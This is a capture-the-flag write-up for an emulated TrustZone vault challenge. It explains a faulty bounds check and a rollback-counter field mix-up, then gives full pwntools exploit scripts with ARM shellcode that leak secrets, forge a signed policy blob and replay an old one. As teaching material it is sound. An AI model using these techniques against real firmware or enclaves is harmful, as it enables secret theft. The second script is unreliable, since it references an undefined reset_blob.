

## Architecture Overview

The challenge implements a mini-kernel ("unicornel") that runs emulated processes inside **Unicorn Engine** instances. Each process is an ARM/x86/etc binary running in an isolated Unicorn VM, communicating with the kernel via software interrupts (`SWI` on ARM) that dispatch to a syscall table.

The key component is a **TrustZone module** (`tz_vault_bin`) — a flat ARM32 binary loaded at `0x50000` that implements a secure vault (HSM) with PIN-based authentication, policy blob management, and a flag-reading mechanism.

### Memory Layout of the TrustZone Binary

```asm 
0x50000:  .text          (code, entry point _tz_start)
0x51000:  (end of .text)
  ...gap...
0x52000:  vault_state    (is_locked, session_token)
0x52100:  master_pin[16] ← SECRET (injected at runtime by kernel)
0x52110:  crc_key[32]    ← SECRET (injected at runtime by kernel)
0x52130:  objects[8×80]  (vault object storage)
0x523B0:  nvram_state    (rollback_counter, policy_ver, flags, flag_key[16])
0x523BC:  nvram.flag_key ← set when a policy blob is loaded
```

All secrets (`master_pin`, `crc_key`, `flag_key`) are **zeroed in the distributed binary** and injected at runtime by the kernel's `create_trustzone()` function. The player must reverse-engineer `tz_vault_bin` (stripped, no symbols) and find exploitable bugs to leak these values.

### Syscall Interface

The user process communicates with the TZ via `trustzone_invoke` (syscall 10), passing a command ID in `r1` and arguments in `r2`–`r4`. The TZ dispatches on the command:

|Cmd|Name|Description|
|---|---|---|
|1|CMD_LOAD|Copy `len` bytes from `src` to `dst` inside TZ memory|
|3|CMD_VERIFY_PIN|Compare user-supplied PIN against `master_pin`; unlock vault|
|5|CMD_UPDATE_POLICY|Validate and apply a policy blob, updating nvram|
|7|CMD_READ_FLAG|Copy `nvram.flag_key` to user-specified address|

### Flag Delivery Mechanism

When a process calls `write()` (syscall 1) with exactly 16 bytes matching the server's `flag_key` file, the kernel intercepts the write and returns the actual flag content instead. So the exploit chain ends with writing the correct `flag_key` to the output pipe.

---

## Bug 1: Incomplete Bounds Check in `cmd_load`

### The Vulnerability

In `cmd_load`, the bounds check prevents reading from the TZ code section only:

```c
#define TZ_TEXT_END   0x51000   /* BUG: only end of .text */
#define TZ_REAL_END   0x54000   /* correct value, never used */

static int32_t cmd_load(uint32_t src, uint32_t len, uint32_t dst) {
    if (!len || len > MAX_LEN) return ERR_TOO_LONG;
    if (src >= TZ_BASE && src < TZ_TEXT_END) return ERR_FORBIDDEN;  // ← BUG
    tz_memcpy((uint8_t*)dst, (const uint8_t*)src, len);
    return ERR_OK;
}
```

The check blocks reads in `[0x50000, 0x51000)` but the `.data` section (containing secrets) starts at `0x52000`. Since `0x52100 >= 0x51000`, the check **passes**, allowing direct reads of:

- `master_pin` at `0x52100` (16 bytes)
- `crc_key` at `0x52110` (32 bytes)

### Exploitation

Call `CMD_LOAD(src=0x52100, len=48, dst=USER_BUFFER)` to copy both `master_pin` and `crc_key` into user-readable memory, then `write()` them out.

---

## Bug 2: Rollback Counter Reset via Field Confusion

### The Vulnerability

In `cmd_update_policy`, the anti-rollback check uses `blob.anti_rollback_ver` (offset +4 in the blob), but the counter **update** uses `blob.policy_ver` (offset +8):

```c
static int32_t cmd_update_policy(uint32_t blob_addr) {
    if (vault_is_locked) return ERR_FORBIDDEN;
    // ... CRC and magic validation ...

    // CHECK uses anti_rollback_ver (correct)
    if (blob.anti_rollback_ver < nvram.rollback_counter) return ERR_ROLLBACK;

    nvram.policy_ver = blob.policy_ver;
    nvram.flags      = blob.flags;
    tz_memcpy(nvram.flag_key, blob.flag_key, KEY_LEN);

    // UPDATE uses policy_ver (BUG! should be anti_rollback_ver)
    nvram.rollback_counter = blob.policy_ver;  // ← WRONG FIELD
    return ERR_OK;
}
```

### Exploitation

With `crc_key` leaked from Bug 1, we can **forge** valid policy blobs:

1. **Forge a reset blob**: `anti_rollback_ver=5` (passes `>= 5` check), `policy_ver=0` → counter becomes 0
2. **Replay `policy_v1.blob`**: `anti_rollback_ver=1` (now passes `>= 0`), which contains the **real `flag_key`** in plaintext

This is possible because `policy_v1` was the initial release where `flag_key` was stored unencrypted (as noted in `RELEASE_NOTES.txt`).

---

## Full Exploit Chain

```
Phase 1 — Leak via Bug 1:
  ┌─────────────────────────────────┐
  │ create_trustzone(tz_vault_bin)  │
  │ CMD_LOAD(0x52100, 48, user_buf) │  ← bypasses bounds check
  │ write(user_buf, 48)             │  ← sends master_pin + crc_key
  └─────────────────────────────────┘
            │
            ▼
    master_pin (16 bytes) + crc_key (32 bytes)

Phase 2 — Flag via Bug 2:
  ┌──────────────────────────────────────────────────┐
  │ create_trustzone(tz_vault_bin)                   │
  │ CMD_VERIFY_PIN(master_pin)           → unlock    │
  │ CMD_UPDATE_POLICY(reset_blob)        → ctr: 5→0 │  ← forged blob
  │ CMD_UPDATE_POLICY(policy_v1.blob)    → flag_key  │  ← replay attack
  │ CMD_READ_FLAG(user_buf)              → 16 bytes  │
  │ write(user_buf, 16)                  → FLAG!     │  ← kernel intercept
  └──────────────────────────────────────────────────┘
```

### Forged Reset Blob Structure

```
Offset  Field               Value       Purpose
+0      magic               0x424C4F42  "BLOB"
+4      anti_rollback_ver   5           passes >= 5 check
+8      policy_ver          0           resets counter to 0
+12     flags               0           don't care
+16     flag_key[16]        zeros       don't care
+32     crc32               computed    CRC32(body || crc_key)
```

---

## Summary of Required Player Knowledge

1. **Reverse-engineer `tz_vault_bin`** (ARM32 flat binary, stripped) in Ghidra/IDA, set base address to `0x50000`
2. **Identify the `cmd_load` bounds check bug**: constant `0x51000` vs actual data at `0x52000+`
3. **Identify the `cmd_update_policy` field confusion**: `policy_ver` used where `anti_rollback_ver` should be
4. **Understand the policy blob format** and CRC validation (keyed CRC32)
5. **Write ARM32 shellcode** compatible with the unicornel syscall interface
6. **Chain both bugs**: leak → forge → rollback → replay → flag


> [!SUCCESS]- Exploit Bug 1:  Incomplete Bounds Check
> ```python
> from pwn import *
> import struct, sys, os, time
> 
> UC_ARCH_ARM = 1
> UC_MODE_ARM = 0
> 
> TZ_LOAD_ADDR       = 0x50000
> TZ_FILE_NAME       = b"tz_vault.bin\x00"
> MASTER_PIN_VM_ADDR = 0x52100
> 
> CODE_ADDR    = 0x0000
> CODE_LEN     = 0x1000
> FILENAME_OFF = 0x100
> 
> # Mappa output lontanissima dalla TZ per evitare qualsiasi conflitto
> OUTPUT_MAP_ADDR = 0x200000
> OUTPUT_MAP_LEN  = 0x1000
> OUTPUT_ADDR     = 0x200008   # dst: retcode a 0x200004, pin a 0x200008
> 
> MARKER = 0xDEADBEEF
> CMD_LOAD = 1
> PIN_LEN  = 16
> 
> # struct unicornelf __attribute__((packed)) = 75 bytes
> UNICORNELF_FMT = "=iiQQQQQQQQHB"
> assert struct.calcsize(UNICORNELF_FMT) == 75
> 
> def mk_elf(maps, code_len):
>     padded = list(maps) + [(0,0)] * (4 - len(maps))
>     flat   = [x for va,ln in padded for x in (va,ln)]
>     return struct.pack(UNICORNELF_FMT, UC_ARCH_ARM, UC_MODE_ARM,
>                         *flat, code_len, len(maps))
> 
> def build_shellcode():
>     context.arch = 'arm'; context.bits = 32; context.endian = 'little'
>     sc = asm(f"""
>         /* 1. create_trustzone */
>         mov  r0, #8
>         ldr  r1, =0x{TZ_LOAD_ADDR:08x}
>         ldr  r2, =0x{CODE_ADDR + FILENAME_OFF:08x}
>         swi  #0
> 
>         /* 2. trustzone_invoke: r1=cmd, r2=src, r3=len, r4=dst */
>         mov  r1, #{CMD_LOAD}
>         ldr  r2, =0x{MASTER_PIN_VM_ADDR:08x}
>         mov  r3, #48
>         ldr  r4, =0x{OUTPUT_ADDR:08x}
>         mov  r0, #10
>         swi  #0
> 
>         /* 3. Scrivi marker 0xDEADBEEF a OUTPUT_ADDR-8 */
>         ldr  r1, =0x{OUTPUT_ADDR-8:08x}
>         ldr  r2, =0x{MARKER:08x}
>         str  r2, [r1]
> 
>         /* 4. write(OUTPUT_ADDR-8, 24): marker[4]+retcode[4]+pin[16] */
>         mov  r0, #1
>         ldr  r1, =0x{OUTPUT_ADDR-8:08x}
>         mov  r2, #56
>         swi  #0
> 
>         /* 5. exit */
>         mov  r0, #0
>         swi  #0
>         .pool
>     """)
>     pad = FILENAME_OFF - len(sc)
>     assert pad >= 0, f"shellcode troppo grande: {len(sc)} > {FILENAME_OFF}"
>     return sc + b'\x00' * pad + TZ_FILE_NAME
> 
> def exploit(io):
>     sc  = build_shellcode()
>     elf = mk_elf([(CODE_ADDR, CODE_LEN), (OUTPUT_MAP_ADDR, OUTPUT_MAP_LEN)], len(sc))
> 
>     log.info(f"struct: {len(elf)} bytes  |  shellcode: {len(sc)} bytes")
>     log.info(f"output mappa: [0x{OUTPUT_MAP_ADDR:x}, 0x{OUTPUT_MAP_ADDR+OUTPUT_MAP_LEN:x})")
>     log.info(f"dst=0x{OUTPUT_ADDR:x}  marker@0x{OUTPUT_ADDR-8:x}  retcode@0x{OUTPUT_ADDR-4:x}")
> 
>     io.recvuntil(b"Welcome to the unicornel!\n")
>     log.info("Banner OK")
> 
>     io.send(elf)
>     io.recvuntil(b"CODE_START\n")
>     log.info("CODE_START → invio shellcode")
>     io.send(sc)
> 
>     # Raccoglie tutto il buffer cercando il marker
>     MARKER_BYTES = struct.pack('<I', MARKER)
>     buf = b''
>     deadline = time.time() + 10
>     while time.time() < deadline:
>         try:
>             chunk = io.recv(timeout=0.5)
>             if chunk:
>                 buf += chunk
>                 if MARKER_BYTES in buf and b'Process ' in buf:
>                     break
>         except EOFError:
>             break
> 
>     log.info(f"Buffer totale ({len(buf)} bytes):")
>     for line in buf.decode(errors='replace').splitlines():
>         log.info(f"  {line}")
> 
>     # Diagnosi injection
>     if b'master_pin injected' not in buf:
>         log.warning("'master_pin injected' NON trovato nel log!")
> 
>     if b'Failed on uc_mem_map' in buf:
>         log.error("uc_mem_map fallisce!")
>         return
> 
>     # Cerca il marker
>     if MARKER_BYTES not in buf:
>         log.error("Marker 0xDEADBEEF non trovato nel buffer.")
>         return
> 
>     idx  = buf.index(MARKER_BYTES)
>     data = buf[idx:idx+56]
>     
>     rc  = struct.unpack_from('<i', data, 4)[0]
>     pin     = data[8:24]
>     crc_key = data[24:56]
> 
>     if rc == 0:
>         log.success("master_pin leakato!")
>         log.success(f"hex:   {pin.hex()}")
>         log.success(f"ascii: {pin.decode('ascii', errors='replace')!r}")
>     else:
>         log.error(f"Return code inatteso: {rc}")
> 
> if __name__ == '__main__':
>     args = sys.argv[1:]
>     if '--tcp' in args:
>         i    = args.index('--tcp')
>         host = args[i+1] if i+1 < len(args) else 'localhost'
>         port = int(args[i+2]) if i+2 < len(args) else 1337
>         io   = remote(host, port)
>     else:
>         io = process('./chal')
>     exploit(io)
>     io.close()
> ```

> [!SUCCESS]- Exploit Bug 2: Anti-Rollback Reset 
> ```python
> #!/usr/bin/env python3
> """
> exploit_bug2.py: rollback counter reset -> flag
> 
> Bug sfruttato:
>   cmd_update_policy aggiorna rollback_counter con blob.policy_ver
>   invece di blob.anti_rollback_ver.
> 
>   Exploit:
>     1. verify_pin con master_pin          -> vault sbloccato
>     2. update_policy con reset_blob       -> counter 5→0
>        (anti_rollback=5 passa check, policy_ver=0 resetta counter)
>     3. update_policy con policy_v1.blob   -> flag_key in chiaro in nvram
>        (anti_rollback=1 >= 0 ora accettato)
>     4. CMD_READ_FLAG                      -> flag_key copiata in user memory
>     5. write(flag_key, 16)                -> kernel intercetta → restituisce flag
> """
> from pwn import *
> import struct, zlib, sys, os, time
> 
> #  INSERISCI I VALORI OTTENUTI DA exploit_bug1.py
> MASTER_PIN_HEX = "464b364f706132396154657670472378"   # FK6Opa29aTevpG#x
> CRC_KEY_HEX    = "089631cc1dd1258c3d72969f30820445678dc42ccba718c46e0ac1c176bec1a0"
> 
> #  Costanti Unicorn 
> UC_ARCH_ARM = 1
> UC_MODE_ARM = 0
> 
> TZ_LOAD_ADDR = 0x50000
> TZ_FILE_NAME = b"tz_vault.bin\x00"
> 
> CODE_ADDR       = 0x0000
> CODE_LEN        = 0x1000
> FILENAME_OFF    = 0x100
> OUTPUT_MAP_ADDR = 0x200000
> OUTPUT_MAP_LEN  = 0x2000
> OUTPUT_ADDR     = 0x200008
> 
> CMD_VERIFY_PIN    = 3
> CMD_UPDATE_POLICY = 5
> CMD_READ_FLAG     = 7
> 
> BLOB_MAGIC = 0x424C4F42
> 
> UNICORNELF_FMT = "=iiQQQQQQQQHB"
> assert struct.calcsize(UNICORNELF_FMT) == 75
> 
> def mk_elf(maps, code_len):
>     padded = list(maps) + [(0,0)]*(4-len(maps))
>     flat   = [x for va,ln in padded for x in (va,ln)]
>     return struct.pack(UNICORNELF_FMT, UC_ARCH_ARM, UC_MODE_ARM,
>                         *flat, code_len, len(maps))
> 
> def crc32_with_key(data: bytes, key: bytes) -> int:
>     return zlib.crc32(data + key) & 0xFFFFFFFF
> 
> def make_blob(anti_rollback_ver, policy_ver, flags, flag_key, crc_key):
>     body = struct.pack('<IIII', BLOB_MAGIC, anti_rollback_ver, policy_ver, flags)
>     body += flag_key[:16].ljust(16, b'\x00')
>     return body + struct.pack('<I', crc32_with_key(body, crc_key))
> 
> def build_shellcode(master_pin: bytes, reset_blob: bytes, blob_v1: bytes):
>     """
>     Shellcode layout nel CODE map (0x0000):
>       0x000  istruzioni ARM32
>       0x200  master_pin (16 bytes)
>       0x240  reset_blob (36 bytes)
>       0x280  blob_v1    (36 bytes)
>     """
>     PIN_IN_CODE   = CODE_ADDR + 0x200
>     BLOB1_IN_CODE = CODE_ADDR + 0x240   # reset_blob
>     BLOB2_IN_CODE = CODE_ADDR + 0x280   # policy_v1
> 
>     context.arch = 'arm'; context.bits = 32; context.endian = 'little'
>     sc = asm(f"""
>         /* crea trustzone */
>         mov  r0, #8
>         ldr  r1, =0x{TZ_LOAD_ADDR:08x}
>         ldr  r2, =0x{CODE_ADDR + FILENAME_OFF:08x}
>         swi  #0
> 
>         /* CMD_VERIFY_PIN */
>         mov  r1, #{CMD_VERIFY_PIN}
>         ldr  r2, =0x{PIN_IN_CODE:08x}
>         mov  r3, #0
>         ldr  r4, =0x{OUTPUT_ADDR:08x}
>         mov  r0, #10
>         swi  #0
> 
>         /* CMD_UPDATE_POLICY reset_blob: counter 5→0 */
>         mov  r1, #{CMD_UPDATE_POLICY}
>         ldr  r2, =0x{BLOB1_IN_CODE:08x}
>         mov  r3, #0
>         ldr  r4, =0x{OUTPUT_ADDR:08x}
>         mov  r0, #10
>         swi  #0
> 
>         /* CMD_UPDATE_POLICY policy_v1: carica flag_key in nvram */
>         mov  r1, #{CMD_UPDATE_POLICY}
>         ldr  r2, =0x{BLOB2_IN_CODE:08x}
>         mov  r3, #0
>         ldr  r4, =0x{OUTPUT_ADDR:08x}
>         mov  r0, #10
>         swi  #0
> 
>         /* CMD_READ_FLAG: copia flag_key in OUTPUT_ADDR */
>         mov  r1, #{CMD_READ_FLAG}
>         ldr  r2, =0x{OUTPUT_ADDR:08x}
>         mov  r3, #0
>         ldr  r4, =0x{OUTPUT_ADDR + 20:08x}
>         mov  r0, #10
>         swi  #0
> 
>         /* write(OUTPUT_ADDR, 16): kernel intercetta → flag */
>         mov  r0, #1
>         ldr  r1, =0x{OUTPUT_ADDR:08x}
>         mov  r2, #16
>         swi  #0
> 
>         mov  r0, #0
>         swi  #0
>         .pool
>     """)
> 
>     # Filename string
>     pad = FILENAME_OFF - len(sc)
>     assert pad >= 0, f"shellcode troppo grande: {len(sc)}"
>     sc = sc + b'\x00'*pad + TZ_FILE_NAME
> 
>     # Dati nel CODE map
>     code = bytearray(CODE_LEN)
>     code[:len(sc)] = sc
>     code[0x200:0x210] = master_pin[:16]
>     code[0x240:0x264] = reset_blob[:36]
>     code[0x280:0x2a4] = blob_v1[:36]
>     return bytes(code)
> 
> 
> def exploit(io, master_pin: bytes, crc_key: bytes,
>             blob_v1_path="firmware_archive/policy_v1.blob"):
> 
>     # Carica policy_v1.blob
>     if not os.path.exists(blob_v1_path):
>         log.error(f"{blob_v1_path} non trovato")
>         return
>     with open(blob_v1_path, "rb") as f:
>         blob_v1 = f.read()
> 
>     # Verifica CRC del blob con crc_key leakato
>     body = blob_v1[:-4]
>     stored = struct.unpack_from('<I', blob_v1, 32)[0]
>     computed = crc32_with_key(body, crc_key)
>     if stored != computed:
>         log.error(f"CRC blob_v1 non valido")
>         return
>     log.success("CRC blob_v1 verificato ✓")
> 
>     sc = build_shellcode(master_pin, reset_blob, blob_v1)
>     maps = [(CODE_ADDR, CODE_LEN), (OUTPUT_MAP_ADDR, OUTPUT_MAP_LEN)]
>     elf  = mk_elf(maps, CODE_LEN)
> 
>     io.recvuntil(b"Welcome to the unicornel!\n")
>     io.send(elf)
>     io.recvuntil(b"CODE_START\n")
>     io.send(sc)
> 
>     # Raccoglie output cercando la flag
>     buf = io.recvall(timeout=5)
>     text = buf.decode(errors='replace')
>     if 'DAJE{' in text:
>         log.success("FLAG TROVATA!")
>     else:
>         log.error("Flag non trovata.")
> 
> if __name__ == '__main__':
>     args = sys.argv[1:]
>     master_pin = bytes.fromhex(MASTER_PIN_HEX)
>     crc_key = bytes.fromhex(CRC_KEY_HEX)
> 
>     if '--tcp' in args:
>         io = remote(args[1], int(args[2]))
>     else:
>         io = process('./chal')
> 
>     exploit(io, master_pin, crc_key)
>     io.close()
> ```
> 